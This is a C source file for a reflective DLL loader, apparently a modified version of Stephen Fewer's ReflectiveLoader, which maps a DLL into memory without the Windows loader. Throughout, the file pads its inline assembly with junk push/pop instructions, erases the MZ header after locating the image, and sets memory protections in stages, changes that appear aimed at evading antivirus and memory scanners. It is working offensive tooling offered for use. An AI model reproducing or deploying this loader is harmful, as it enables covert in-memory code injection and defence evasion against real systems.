//===============================================================================================//
// Copyright (c) 2013, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without modification, are permitted
// provided that the following conditions are met:
//
//     * Redistributions of source code must retain the above copyright notice, this list of
// conditions and the following disclaimer.
//
//     * Redistributions in binary form must reproduce the above copyright notice, this list of
// conditions and the following disclaimer in the documentation and/or other materials provided
// with the distribution.
//
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#include "ReflectiveLoader.h"
//===============================================================================================//
// Our loader will set this to a pseudo correct HINSTANCE/HMODULE value
HINSTANCE hAppInstance = NULL;
//===============================================================================================//
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif
// This function can not be inlined by the compiler or we will not get the address we expect. Ideally
// this code will be compiled with the /O2 and /Ob1 switches. Bonus points if we could take advantage of
// RIP relative addressing in this instance but I dont believe we can do so with the compiler intrinsics
// available (and no inline asm available under x64).
__declspec(noinline) ULONG_PTR caller( VOID ) { 
	__asm {
	push eax
	pop eax
		push	ebp
	push eax
	pop eax
		mov	ebp, esp
	push eax
	pop eax
		mov	eax, DWORD PTR [ebp+4]
	push eax
	pop eax
		pop	ebp
	push eax
	pop eax
		ret
	push eax
	pop eax
	}	
}
//===============================================================================================//

// Note 1: If you want to have your own DllMain, define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN,
//         otherwise the DllMain at the end of this file will be used.

// Note 2: If you are injecting the DLL via LoadRemoteLibraryR, define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR,
//         otherwise it is assumed you are calling the ReflectiveLoader via a stub.

#ifdef RDIDLL_NOEXPORT
#define RDIDLLEXPORT
#else
#define RDIDLLEXPORT DLLEXPORT
#endif





void step_1(
	ULONG_PTR *uiValueA_ptr,
	ULONG_PTR *uiValueB_ptr,
	USHORT *usCounter_ptr,
	ULONG_PTR *uiValueC_ptr,
	ULONG_PTR *uiBaseAddress_ptr,
	ULONG_PTR *uiExportDir_ptr,
	ULONG_PTR *uiNameArray_ptr,
	ULONG_PTR *uiNameOrdinals_ptr,
	DWORD *dwHashValue_ptr,
	ULONG_PTR *uiAddressArray_ptr,
	LOADLIBRARYA *pLoadLibraryA_ptr,
	GETPROCADDRESS *pGetProcAddress_ptr,
	VIRTUALPROTECT *pVirtualProtect_ptr,
	VIRTUALALLOC *pVirtualAlloc_ptr,
	VIRTUALLOCK *pVirtualLock_ptr,
	NTFLUSHINSTRUCTIONCACHE *pNtFlushInstructionCache_ptr
) {
	while( (*uiValueA_ptr) )
	{
		// get pointer to current modules name (unicode string)
		(*uiValueB_ptr) = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)(*uiValueA_ptr))->BaseDllName.pBuffer;

		// set bCounter to the length for the loop
		(*usCounter_ptr) = ((PLDR_DATA_TABLE_ENTRY)(*uiValueA_ptr))->BaseDllName.Length;
		// clear (*uiValueC_ptr) which will store the hash of the module name
		(*uiValueC_ptr) = 0;

		// compute the hash of the module name...
		ULONG_PTR tmpValC = (*uiValueC_ptr);
		do
		{
			tmpValC = ror( (DWORD)tmpValC );
			// normalize to uppercase if the module name is in lowercase
			if( *((BYTE *)(*uiValueB_ptr)) >= 'a' )
				tmpValC += *((BYTE *)(*uiValueB_ptr)) - 0x20;
			else
				tmpValC += *((BYTE *)(*uiValueB_ptr));
			(*uiValueB_ptr)++;
		} while( --(*usCounter_ptr) );
		(*uiValueC_ptr) = tmpValC;

		// compare the hash with that of kernel32.dll
		if( (DWORD)(*uiValueC_ptr) == KERNEL32DLL_HASH )
		{
			// get this modules base address
			(*uiBaseAddress_ptr) = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)(*uiValueA_ptr))->DllBase;

			// get the VA of the modules NT Header
			(*uiExportDir_ptr) = (*uiBaseAddress_ptr) + ((PIMAGE_DOS_HEADER)(*uiBaseAddress_ptr))->e_lfanew;

			// (*uiNameArray_ptr) = the address of the modules export directory entry
			(*uiNameArray_ptr) = (ULONG_PTR)&((PIMAGE_NT_HEADERS)(*uiExportDir_ptr))->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

			// get the VA of the export directory
			(*uiExportDir_ptr) = ( (*uiBaseAddress_ptr) + ((PIMAGE_DATA_DIRECTORY)(*uiNameArray_ptr))->VirtualAddress );

			// get the VA for the array of name pointers
			(*uiNameArray_ptr) = ( (*uiBaseAddress_ptr) + ((PIMAGE_EXPORT_DIRECTORY )(*uiExportDir_ptr))->AddressOfNames );

			// get the VA for the array of name ordinals
			(*uiNameOrdinals_ptr) = ( (*uiBaseAddress_ptr) + ((PIMAGE_EXPORT_DIRECTORY )(*uiExportDir_ptr))->AddressOfNameOrdinals );

			(*usCounter_ptr) = 5;

			// loop while we still have imports to find
			while( (*usCounter_ptr) > 0 )
			{
				// compute the hash values for this function name
				(*dwHashValue_ptr) = _hash( (char *)( (*uiBaseAddress_ptr) + DEREF_32( (*uiNameArray_ptr) ) )  );

				// if we have found a function we want we get its virtual address
				if( (*dwHashValue_ptr) == LOADLIBRARYA_HASH
					|| (*dwHashValue_ptr) == GETPROCADDRESS_HASH
					|| (*dwHashValue_ptr) == VIRTUALPROTECT_HASH
					|| (*dwHashValue_ptr) == VIRTUALALLOC_HASH
					|| (*dwHashValue_ptr) == VIRTUALLOCK_HASH
					)
				{
					// get the VA for the array of addresses
					(*uiAddressArray_ptr) = ( (*uiBaseAddress_ptr) + ((PIMAGE_EXPORT_DIRECTORY )(*uiExportDir_ptr))->AddressOfFunctions );

					// use this functions name ordinal as an index into the array of name pointers
					(*uiAddressArray_ptr) += ( DEREF_16( (*uiNameOrdinals_ptr) ) * sizeof(DWORD) );

					// store this functions VA
					if( (*dwHashValue_ptr) == LOADLIBRARYA_HASH )
						(*pLoadLibraryA_ptr) = (LOADLIBRARYA)( (*uiBaseAddress_ptr) + DEREF_32( (*uiAddressArray_ptr) ) );
					else if( (*dwHashValue_ptr) == GETPROCADDRESS_HASH )
						(*pGetProcAddress_ptr) = (GETPROCADDRESS)( (*uiBaseAddress_ptr) + DEREF_32( (*uiAddressArray_ptr) ) );
					else if( (*dwHashValue_ptr) == VIRTUALPROTECT_HASH)
						(*pVirtualProtect_ptr) = (VIRTUALPROTECT)( (*uiBaseAddress_ptr) + DEREF_32( (*uiAddressArray_ptr) ) );
					else if( (*dwHashValue_ptr) == VIRTUALALLOC_HASH )
						(*pVirtualAlloc_ptr) = (VIRTUALALLOC)( (*uiBaseAddress_ptr) + DEREF_32( (*uiAddressArray_ptr) ) );
					else if( (*dwHashValue_ptr) == VIRTUALLOCK_HASH )
						(*pVirtualLock_ptr) = (VIRTUALLOCK)( (*uiBaseAddress_ptr) + DEREF_32( (*uiAddressArray_ptr) ) );

					// decrement our counter
					(*usCounter_ptr)--;
				}

				// get the next exported function name
				(*uiNameArray_ptr) += sizeof(DWORD);

				// get the next exported function name ordinal
				(*uiNameOrdinals_ptr) += sizeof(WORD);
			}
		}
		else if( (DWORD)(*uiValueC_ptr) == NTDLLDLL_HASH )
		{
			// get this modules base address
			(*uiBaseAddress_ptr) = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)(*uiValueA_ptr))->DllBase;

			// get the VA of the modules NT Header
			(*uiExportDir_ptr) = (*uiBaseAddress_ptr) + ((PIMAGE_DOS_HEADER)(*uiBaseAddress_ptr))->e_lfanew;

			// (*uiNameArray_ptr) = the address of the modules export directory entry
			(*uiNameArray_ptr) = (ULONG_PTR)&((PIMAGE_NT_HEADERS)(*uiExportDir_ptr))->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

			// get the VA of the export directory
			(*uiExportDir_ptr) = ( (*uiBaseAddress_ptr) + ((PIMAGE_DATA_DIRECTORY)(*uiNameArray_ptr))->VirtualAddress );

			// get the VA for the array of name pointers
			(*uiNameArray_ptr) = ( (*uiBaseAddress_ptr) + ((PIMAGE_EXPORT_DIRECTORY )(*uiExportDir_ptr))->AddressOfNames );

			// get the VA for the array of name ordinals
			(*uiNameOrdinals_ptr) = ( (*uiBaseAddress_ptr) + ((PIMAGE_EXPORT_DIRECTORY )(*uiExportDir_ptr))->AddressOfNameOrdinals );

			(*usCounter_ptr) = 1;

			// loop while we still have imports to find
			while( (*usCounter_ptr) > 0 )
			{
				// compute the hash values for this function name
				(*dwHashValue_ptr) = _hash( (char *)( (*uiBaseAddress_ptr) + DEREF_32( (*uiNameArray_ptr) ) )  );

				// if we have found a function we want we get its virtual address
				if( (*dwHashValue_ptr) == NTFLUSHINSTRUCTIONCACHE_HASH )
				{
					// get the VA for the array of addresses
					(*uiAddressArray_ptr) = ( (*uiBaseAddress_ptr) + ((PIMAGE_EXPORT_DIRECTORY )(*uiExportDir_ptr))->AddressOfFunctions );

					// use this functions name ordinal as an index into the array of name pointers
					(*uiAddressArray_ptr) += ( DEREF_16( (*uiNameOrdinals_ptr) ) * sizeof(DWORD) );

					// store this functions VA
					if( (*dwHashValue_ptr) == NTFLUSHINSTRUCTIONCACHE_HASH )
						(*pNtFlushInstructionCache_ptr) = (NTFLUSHINSTRUCTIONCACHE)( (*uiBaseAddress_ptr) + DEREF_32( (*uiAddressArray_ptr) ) );

					// decrement our counter
					(*usCounter_ptr)--;
				}

				// get the next exported function name
				(*uiNameArray_ptr) += sizeof(DWORD);

				// get the next exported function name ordinal
				(*uiNameOrdinals_ptr) += sizeof(WORD);
			}
		}

		// we stop searching when we have found everything we need.
		if( (*pLoadLibraryA_ptr)
			&& (*pGetProcAddress_ptr)
			&& (*pVirtualProtect_ptr)
			&& (*pVirtualAlloc_ptr)
			&& (*pVirtualLock_ptr)
			&& (*pNtFlushInstructionCache_ptr)
			)
			break;

		// get the next entry
		(*uiValueA_ptr) = DEREF( (*uiValueA_ptr) );
	}
}






// This is our position independent reflective DLL loader/injector
#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
RDIDLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )
#else
RDIDLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
#endif
{
	// the functions we need
	LOADLIBRARYA pLoadLibraryA     = NULL;
	GETPROCADDRESS pGetProcAddress = NULL;
	VIRTUALPROTECT pVirtualProtect = NULL;
	VIRTUALALLOC pVirtualAlloc     = NULL;
	NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;
	VIRTUALLOCK pVirtualLock	   = NULL;

	USHORT usCounter;

	DWORD old_protect = 0;
	BOOL vp_succeeded;

	// the initial location of this image in memory
	ULONG_PTR uiLibraryAddress;
	// the kernels base address and later this images newly loaded base address
	ULONG_PTR uiBaseAddress;

	// variables for processing the kernels export table
	ULONG_PTR uiAddressArray;
	ULONG_PTR uiNameArray;
	ULONG_PTR uiExportDir;
	ULONG_PTR uiNameOrdinals;
	DWORD dwHashValue;

	char *DOS_header;

	// variables for loading this image
	ULONG_PTR uiHeaderValue;
	ULONG_PTR uiValueA;
	ULONG_PTR uiValueB;
	ULONG_PTR uiValueC;
	ULONG_PTR uiValueD;
	ULONG_PTR uiValueE;

	// STEP 0: calculate our images current base address

	// we will start searching backwards from our callers return address.
	uiLibraryAddress = caller();

	// loop through memory backwards searching for our images base address
	// we dont need SEH style search as we shouldnt generate any access violations with this
	__asm {
push eax
pop eax
		PUSHAD	
push eax
pop eax

		mov	esi, eax
push eax
pop eax
		jmp	L5
push eax
pop eax
	L3:
push eax
pop eax
		sub	esi, 1
push eax
pop eax
	L5:
push eax
pop eax
		cmp	WORD PTR [esi], 23117
push eax
pop eax
		jne	L3
push eax
pop eax
		mov	edx, DWORD PTR [esi+60]
push eax
pop eax
		lea	ecx, [edx-64]
push eax
pop eax
		cmp	ecx, 959
push eax
pop eax
		ja	L3
push eax
pop eax
		add	edx, esi
push eax
pop eax
		cmp	DWORD PTR [edx], 17744
push eax
pop eax
		jne	L3
push eax
pop eax

		mov uiHeaderValue, edx
push eax
pop eax
		mov uiLibraryAddress, esi 
push eax
pop eax

		POPAD
push eax
pop eax
	}

	// stomp MZ
	DOS_header = (char *)uiLibraryAddress;
	DOS_header[0] = 0;
	DOS_header[1] = 0;

	// STEP 1: process the kernels exports for the functions our loader needs...

	// get the Process Enviroment Block
#ifdef _WIN64
	uiBaseAddress = __readgsqword( 0x60 );
#else
#ifdef WIN_ARM
	uiBaseAddress = *(DWORD *)( (BYTE *)_MoveFromCoprocessor( 15, 0, 13, 0, 2 ) + 0x30 );
#else // _WIN32
	// uiBaseAddress = __readfsdword( 0x30 );
	__asm {
push eax
pop eax
		PUSHAD
push eax
pop eax

		mov    eax,DWORD PTR fs:[0x30]
push eax
pop eax
		mov uiBaseAddress, eax
push eax
pop eax

		POPAD
push eax
pop eax
	}
#endif
#endif

	// get the processes loaded modules. ref: http://msdn.microsoft.com/en-us/library/aa813708(VS.85).aspx
	// uiBaseAddress = (ULONG_PTR)((_PPEB)uiBaseAddress)->pLdr;

	// get the first entry of the InMemoryOrder module list
	// uiValueA = (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)->InMemoryOrderModuleList.Flink;

	
	__asm {
push eax
pop eax
		PUSHAD
push eax
pop eax

		mov eax, uiBaseAddress
push eax
pop eax
		mov	eax, DWORD PTR [eax+12]
push eax
pop eax
		mov uiBaseAddress, eax
push eax
pop eax
		mov	eax, DWORD PTR [eax+20]
push eax
pop eax
		mov uiValueA, eax
push eax
pop eax

		POPAD
push eax
pop eax
	}

	step_1(
		&uiValueA,
		&uiValueB,
		&usCounter,
		&uiValueC,
		&uiBaseAddress,
		&uiExportDir,
		&uiNameArray,
		&uiNameOrdinals,
		&dwHashValue,
		&uiAddressArray,
		&pLoadLibraryA,
		&pGetProcAddress,
		&pVirtualProtect,
		&pVirtualAlloc,
		&pVirtualLock,
		&pNtFlushInstructionCache
	);

	// STEP 2: load our image into a new permanent location in memory...

	// get the VA of the NT Header for the PE to be loaded
	uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

	// allocate all the memory for the DLL to be loaded into. we can load at any address because we will
	// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
	uiBaseAddress = (ULONG_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );


#ifdef ENABLE_STOPPAGING
	// prevent our image from being swapped to the pagefile
	pVirtualLock((LPVOID)uiBaseAddress, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage);
#endif

	// we must now copy over the headers
	uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
	uiValueB = uiLibraryAddress;
	uiValueC = uiBaseAddress;

	while( uiValueA-- )
		*(BYTE *)uiValueC++ = *(BYTE *)uiValueB++;


	// For later: make header RX
	LPVOID header_base = (LPVOID)uiBaseAddress;
	SIZE_T header_size = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;		
	// For later: make header RX
	LPVOID text_section_base;
	SIZE_T text_section_size;


	// STEP 3: load in all of our sections...

	// uiValueA = the VA of the first section
	uiValueA = ( (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader );

	// itterate through all sections, loading them into memory.
	uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
	while( uiValueE-- )
	{

	
		dwHashValue = _hash( (char *)( (PIMAGE_SECTION_HEADER)uiValueA)->Name );
		if( dwHashValue == 0xebc2f9b4) {
			text_section_base = (LPVOID)( uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress );
			text_section_size = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;
		}

		// uiValueB is the VA for this section
		uiValueB = ( uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress );

		// uiValueC if the VA for this sections data
		uiValueC = ( uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData );

		// copy the section over
		uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;


		while( uiValueD-- )
			*(BYTE *)uiValueB++ = *(BYTE *)uiValueC++;

		// get the VA of the next section
		uiValueA += sizeof( IMAGE_SECTION_HEADER );
	}

	// STEP 4: process our images import table...

	// uiValueB = the address of the import directory
	uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];

	// we assume there is an import table to process
	// uiValueC is the first entry in the import table
	uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );

	// iterate through all imports until a null RVA is found (Characteristics is mis-named)
	while( ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Characteristics )
	{
		// use LoadLibraryA to load the imported module into memory
		uiLibraryAddress = (ULONG_PTR)pLoadLibraryA( (LPCSTR)( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name ) );

		if ( !uiLibraryAddress )
		{
			uiValueC += sizeof( IMAGE_IMPORT_DESCRIPTOR );
			continue;
		}

		// uiValueD = VA of the OriginalFirstThunk
		uiValueD = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk );

		// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
		uiValueA = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk );

		// itterate through all imported functions, importing by ordinal if no name present
		while( DEREF(uiValueA) )
		{
			// sanity check uiValueD as some compilers only import by FirstThunk
			if( uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
			{
				// get the VA of the modules NT Header
				uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

				// uiNameArray = the address of the modules export directory entry
				uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

				// get the VA of the export directory
				uiExportDir = ( uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

				// get the VA for the array of addresses
				uiAddressArray = ( uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

				// use the import ordinal (- export ordinal base) as an index into the array of addresses
				uiAddressArray += ( ( IMAGE_ORDINAL( ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal ) - ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->Base ) * sizeof(DWORD) );

				// patch in the address for this imported function
				DEREF(uiValueA) = ( uiLibraryAddress + DEREF_32(uiAddressArray) );
			}
			else
			{
				// get the VA of this functions import by name struct
				uiValueB = ( uiBaseAddress + DEREF(uiValueA) );

				// use GetProcAddress and patch in the address for this imported function
				DEREF(uiValueA) = (ULONG_PTR)pGetProcAddress( (HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name );
			}
			// get the next imported function
			uiValueA += sizeof( ULONG_PTR );
			if( uiValueD )
				uiValueD += sizeof( ULONG_PTR );
		}

		// get the next import
		uiValueC += sizeof( IMAGE_IMPORT_DESCRIPTOR );
	}

	// STEP 5: process all of our images relocations...

	// calculate the base address delta and perform relocations (even if we load at desired image base)
	uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;

	// uiValueB = the address of the relocation directory
	uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];

	// check if their are any relocations present
	if( ((PIMAGE_DATA_DIRECTORY)uiValueB)->Size )
	{
		uiValueE = ((PIMAGE_BASE_RELOCATION)uiValueB)->SizeOfBlock;

		// uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
		uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );

		// and we itterate through all entries...
		while( uiValueE && ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock )
		{
			// uiValueA = the VA for this relocation block
			uiValueA = ( uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress );

			// uiValueB = number of entries in this relocation block
			uiValueB = ( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof( IMAGE_RELOC );

			// uiValueD is now the first entry in the current relocation block
			uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);

			// we itterate through all the entries in the current block...
			while( uiValueB-- )
			{
				// perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
				// we dont use a switch statement to avoid the compiler building a jump table
				// which would not be very position independent!
				if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64 )
					*(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
				else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW )
					*(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
#ifdef WIN_ARM
				// Note: On ARM, the compiler optimization /O2 seems to introduce an off by one issue, possibly a code gen bug. Using /O1 instead avoids this problem.
				else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_ARM_MOV32T )
				{
					register DWORD dwInstruction;
					register DWORD dwAddress;
					register WORD wImm;
					// get the MOV.T instructions DWORD value (We add 4 to the offset to go past the first MOV.W which handles the low word)
					dwInstruction = *(DWORD *)( uiValueA + ((PIMAGE_RELOC)uiValueD)->offset + sizeof(DWORD) );
					// flip the words to get the instruction as expected
					dwInstruction = MAKELONG( HIWORD(dwInstruction), LOWORD(dwInstruction) );
					// sanity chack we are processing a MOV instruction...
					if( (dwInstruction & ARM_MOV_MASK) == ARM_MOVT )
					{
						// pull out the encoded 16bit value (the high portion of the address-to-relocate)
						wImm  = (WORD)( dwInstruction & 0x000000FF);
						wImm |= (WORD)((dwInstruction & 0x00007000) >> 4);
						wImm |= (WORD)((dwInstruction & 0x04000000) >> 15);
						wImm |= (WORD)((dwInstruction & 0x000F0000) >> 4);
						// apply the relocation to the target address
						dwAddress = ( (WORD)HIWORD(uiLibraryAddress) + wImm ) & 0xFFFF;
						// now create a new instruction with the same opcode and register param.
						dwInstruction  = (DWORD)( dwInstruction & ARM_MOV_MASK2 );
						// patch in the relocated address...
						dwInstruction |= (DWORD)(dwAddress & 0x00FF);
						dwInstruction |= (DWORD)(dwAddress & 0x0700) << 4;
						dwInstruction |= (DWORD)(dwAddress & 0x0800) << 15;
						dwInstruction |= (DWORD)(dwAddress & 0xF000) << 4;
						// now flip the instructions words and patch back into the code...
						*(DWORD *)( uiValueA + ((PIMAGE_RELOC)uiValueD)->offset + sizeof(DWORD) ) = MAKELONG( HIWORD(dwInstruction), LOWORD(dwInstruction) );
					}
				}
#endif
				else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH )
					*(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
				else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW )
					*(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);

				// get the next entry in the current relocation block
				uiValueD += sizeof( IMAGE_RELOC );
			}

			uiValueE -= ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
			// get the next entry in the relocation directory
			uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
		}
	}

	// STEP 6: call our images entry point

	// uiValueA = the VA of our newly loaded DLL/EXE's entry point
	uiValueA = ( uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint );

	// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
	pNtFlushInstructionCache( (HANDLE)-1, NULL, 0 );



	vp_succeeded = pVirtualProtect(header_base, header_size, PAGE_EXECUTE_READ, &old_protect);
	if (!vp_succeeded) {
		return (ULONG_PTR)NULL;
	}
	vp_succeeded = pVirtualProtect(text_section_base, text_section_size, PAGE_EXECUTE_READ, &old_protect);
	if (!vp_succeeded) {
		return (ULONG_PTR)NULL;
	}


	// call our respective entry point, fudging our hInstance value
#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
	// if we are injecting a DLL via LoadRemoteLibraryR we call DllMain and pass in our parameter (via the DllMain lpReserved parameter)
	((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter );
#else
	// if we are injecting an DLL via a stub we call DllMain with no parameter
	((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL );
#endif

	// STEP 8: return our new entry point address so whatever called us can call DllMain() if needed.

	return uiValueA;
}
//===============================================================================================//
#ifndef REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;

	switch( dwReason )
    {
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}

#endif
//===============================================================================================//



